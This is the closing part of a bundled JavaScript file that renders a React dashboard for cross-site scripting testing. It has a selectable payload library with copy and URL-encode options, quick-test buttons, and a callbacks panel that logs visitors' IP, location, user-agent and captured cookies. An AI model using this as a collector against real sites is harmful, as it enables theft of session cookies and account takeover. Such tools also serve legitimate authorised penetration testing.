                        Decoded
                      </button>
                      <button onClick={() => setUrlEncode(true)}
                        className={'px-2.5 py-1 text-[10px] border rounded-sm transition-colors ' +
                          (urlEncode ? 'bg-violet-900 border-violet-700 text-violet-100' : 'bg-zinc-900 border-zinc-700 text-zinc-500')}>
                        URL Encoded
                      </button>
                    </div>
                  </div>

                  <div className="divide-y divide-zinc-800 overflow-y-auto max-h-[480px]">
                    {payloadCategories.map(cat => {
                      const open = activeCategory === cat.id;
                      return (
                        <div key={cat.id}>
                          <button onClick={() => setActiveCategory(open ? null : cat.id)}
                            className="w-full flex items-center justify-between px-4 py-3 text-left hover:bg-zinc-800 transition-colors">
                            <div className="flex items-center gap-2">
                              <span className="text-xs font-semibold text-zinc-200">{cat.name}</span>
                              <span className="text-[9px] px-1.5 py-0.5 bg-zinc-800 border border-zinc-700 text-zinc-500 rounded-sm">
                                {cat.payloads.length}
                              </span>
                            </div>
                            <span className="text-zinc-600 text-[10px]">{open ? '▲' : '▼'}</span>
                          </button>
                          {open && (
                            <div className="divide-y divide-zinc-800 bg-zinc-950/40">
                              {cat.payloads.map((p, i) => (
                                <div key={i} className="p-4">
                                  <div className="flex items-center justify-between mb-2">
                                    <div className="flex items-center gap-2 flex-wrap">
                                      <span className="text-xs text-zinc-200">{p.name}</span>
                                      <span className={'text-[9px] px-1.5 py-0.5 border rounded-sm ' + severityClass(p.severity)}>
                                        {p.severity}
                                      </span>
                                    </div>
                                    <button onClick={() => copy(encode(p.code))}
                                      className="text-[10px] px-2 py-0.5 border border-zinc-700 hover:border-violet-600 hover:text-violet-300 text-zinc-500 rounded-sm transition-colors shrink-0 ml-2">
                                      copy
                                    </button>
                                  </div>
                                  <code className="block text-[10px] text-zinc-400 bg-zinc-950 border border-zinc-800 p-2.5 overflow-x-auto whitespace-pre font-mono leading-relaxed rounded-sm">
                                    {encode(p.code)}
                                  </code>
                                </div>
                              ))}
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>

                  <div className="px-4 py-3 border-t border-zinc-800 mt-auto">
                    <div className="text-[10px] text-zinc-600 uppercase tracking-wider mb-2">Quick Test</div>
                    <div className="grid grid-cols-4 gap-2">
                      {['Script', 'Image', 'Fetch', 'SVG'].map(t => (
                        <button key={t} onClick={() => sendTest(t.toLowerCase())}
                          className="py-1.5 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-xs text-zinc-300 rounded-sm transition-colors">
                          {t}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* ── Callbacks Panel ── */}
                <div className="bg-zinc-900 border border-zinc-800 rounded-sm flex flex-col">
                  <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800">
                    <span className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Callbacks</span>
                    {callbacks.length > 0 && (
                      <span className="text-[10px] px-2 py-0.5 bg-violet-950 border border-violet-800 text-violet-300 rounded-sm">
                        {callbacks.length}
                      </span>
                    )}
                  </div>

                  {callbacks.length === 0 ? (
                    <div className="flex flex-col items-center justify-center py-20 text-zinc-600 flex-1">
                      <div className="text-xs mb-1 font-mono">[ no callbacks captured ]</div>
                      <div className="text-[10px]">Deploy a payload to start receiving hits.</div>
                    </div>
                  ) : (
                    <div className="divide-y divide-zinc-800 overflow-y-auto max-h-[600px]">
                      {callbacks.map(cb => {
                        const selected = selectedId === cb.id;
                        return (
                          <div key={cb.id}
                            onClick={() => setSelectedId(selected ? null : cb.id)}
                            className={'p-3 cursor-pointer transition-colors ' + (selected ? 'bg-zinc-800' : 'hover:bg-zinc-800/50')}>

                            {/* Row header */}
                            <div className="flex items-start justify-between gap-2">
                              <div className="flex flex-wrap items-center gap-1.5">
                                <span className="text-[9px] px-1.5 py-0.5 bg-violet-950 border border-violet-800 text-violet-300 rounded-sm font-mono">
                                  {cb.type.toUpperCase()}
                                </span>
                                <span className="text-[9px] text-zinc-500">
                                  {new Date(cb.timestamp).toLocaleString()}
                                </span>
                                <span className="text-[9px] px-1.5 py-0.5 bg-zinc-800 border border-zinc-700 text-zinc-400 rounded-sm font-mono">
                                  {cb.ip}
                                </span>
                                <span className="text-[9px] text-zinc-600">{cb.country}</span>
                              </div>
                              <button onClick={e => { e.stopPropagation(); deleteCallback(cb.id); }}
                                className="shrink-0 text-[9px] px-1.5 py-0.5 border border-zinc-700 hover:border-red-800 hover:text-red-400 text-zinc-600 rounded-sm transition-colors">
                                del
                              </button>
                            </div>

                            {/* Cookie highlight */}
                            {cb.cookie && cb.cookie !== 'null' && (
                              <div className="mt-2 p-2 bg-amber-950/20 border border-amber-900/40 rounded-sm">
                                <span className="text-[9px] text-amber-500 font-bold uppercase tracking-wider">Cookie</span>
                                <div className="text-[9px] text-amber-300 mt-0.5 font-mono break-all leading-relaxed">
                                  {cb.cookie.substring(0, 140)}{cb.cookie.length > 140 ? '\u2026' : ''}
                                </div>
                              </div>
                            )}

                            {/* Expanded detail */}
                            {selected && (
                              <div className="mt-3 space-y-1.5 border-t border-zinc-700 pt-3">
                                <div className="grid grid-cols-3 gap-1.5">
                                  {[['Country', cb.country], ['City', cb.city], ['Method', cb.method]].map(([label, val]) => (
                                    <div key={label} className="bg-zinc-950 border border-zinc-800 p-2 rounded-sm">
                                      <div className="text-[9px] text-zinc-600 mb-0.5">{label}</div>
                                      <div className="text-[10px] text-zinc-300">{val}</div>
                                    </div>
                                  ))}
                                </div>
                                <div className="bg-zinc-950 border border-zinc-800 p-2 rounded-sm">
                                  <div className="text-[9px] text-zinc-600 mb-0.5">User-Agent</div>
                                  <div className="text-[9px] text-zinc-400 break-all leading-relaxed font-mono">{cb.userAgent}</div>
                                </div>
                                {cb.referer && (
                                  <div className="bg-zinc-950 border border-zinc-800 p-2 rounded-sm">
                                    <div className="text-[9px] text-zinc-600 mb-0.5">Referer</div>
                                    <div className="text-[9px] text-zinc-400 break-all font-mono">{cb.referer}</div>
                                  </div>
                                )}
                                {cb.body && (
                                  <div className="bg-zinc-950 border border-zinc-800 p-2 rounded-sm">
                                    <div className="text-[9px] text-zinc-600 mb-0.5">Body</div>
                                    <pre className="text-[9px] text-zinc-300 whitespace-pre-wrap overflow-x-auto leading-relaxed font-mono">
                                      {typeof cb.body === 'string' ? cb.body : JSON.stringify(cb.body, null, 2)}
                                    </pre>
                                  </div>
                                )}
                                {cb.query && Object.keys(cb.query).length > 0 && (
                                  <div className="bg-zinc-950 border border-zinc-800 p-2 rounded-sm">
                                    <div className="text-[9px] text-zinc-600 mb-0.5">Query Params</div>
                                    <pre className="text-[9px] text-zinc-300 whitespace-pre-wrap font-mono">
                                      {JSON.stringify(cb.query, null, 2)}
                                    </pre>
                                  </div>
                                )}
                              </div>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>

              </div>
            </main>
          </div>
        );
      }

      ReactDOM.render(<App />, document.getElementById('root'));
    <\/script>
  </body>
</html>`;
}
__name(renderAppHtml, "renderAppHtml");
export {
  index_default as default
};
//# sourceMappingURL=index.js.map
